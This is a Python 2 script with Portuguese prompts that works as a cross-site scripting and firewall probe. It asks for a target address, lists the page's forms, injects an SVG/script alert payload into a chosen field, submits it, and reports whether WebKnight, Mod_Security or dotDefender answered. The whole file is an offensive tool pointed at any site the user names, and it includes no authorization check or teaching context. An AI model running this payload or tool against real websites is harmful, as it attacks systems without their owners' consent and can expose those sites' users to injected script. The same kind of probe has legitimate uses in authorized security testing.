import mechanize
import urllib2

maliciousRequest = mechanize.Browser()
maliciousRequest.set_handle_robots(False)

# formName = 'waf'
maliciousRequest.open('http://' + raw_input("Digite o endereco alvo: "))
crossSiteScriptingPayLoad = "<svg><script>alert&grave;1&grave;<p>"

currentForm = 0
for form in maliciousRequest.forms():
    maliciousRequest.select_form(nr=currentForm)
    print 'Forms found: \n' + str(maliciousRequest.form) + '\n'
    print '-----------------------------------------'

    for control in maliciousRequest.form.controls:
        print 'Form: \n' + str(control) + '\n'

        if str(control).find('readonly') > 0:
            print 'Forms is READONLY \n'
            print '-----------------------------------------'
            continue

        print 'Form type: \n' + str(control.type) + '\n'
        print 'Form name: \n' + str(control.name) + '\n'
        print '-----------------------------------------'

    choosenName = raw_input("Digite o nome do form desejado: ")

    maliciousRequest.form[choosenName] = crossSiteScriptingPayLoad
    try:
        maliciousRequest.submit()
        pass
    except mechanize.HTTPError as e:
        pass
    except urllib2.HTTPError as a:
        continue
    response = maliciousRequest.response().read()

    if response.find('WebKnight') >= 0:
        print 'Firewall detected: WebKnight'
    elif response.find('Mod_Security') >= 0:
        print "Firewall detected: Mod Security"
    elif response.find('Mod_Security') >= 0:
        print "Firewall detected: Mod Security"
    elif response.find('dotDefender') >= 0:
        print "Firewall detected: Dot Defender"
    else:
        print "No Firewall Present"
    # Test the nest
    currentForm += 1
